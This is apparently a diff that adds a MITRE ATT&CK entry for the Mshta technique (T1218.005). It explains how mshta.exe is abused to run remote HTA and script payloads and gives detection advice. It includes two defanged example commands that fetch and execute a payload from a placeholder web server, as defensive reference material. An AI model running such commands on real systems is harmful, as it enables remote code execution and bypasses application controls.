@@ -1,0 +1,32 @@
+MITRE ATT&CK Technique: Mshta (T1218.005)
+
+Description:
+Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 
+
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)
+
+Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>
+
+They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>
+
+Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
+
+Detection:
+Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.
+
+Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious
+
+Tactics: defense-evasion
+Required Permissions: User
+Effective Permissions: Unknown
+
+References:
+- Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021. [https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf]
+- McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017. [https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/]
+- Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017. [https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html]
+- Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017. [https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/]
+- Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017. [https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html]
+- Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017. [https://en.wikipedia.org/wiki/HTML_Application]
+- Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017. [https://msdn.microsoft.com/library/ms536471.aspx]
+- LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019. [https://lolbas-project.github.io/lolbas/Binaries/Mshta/]
+
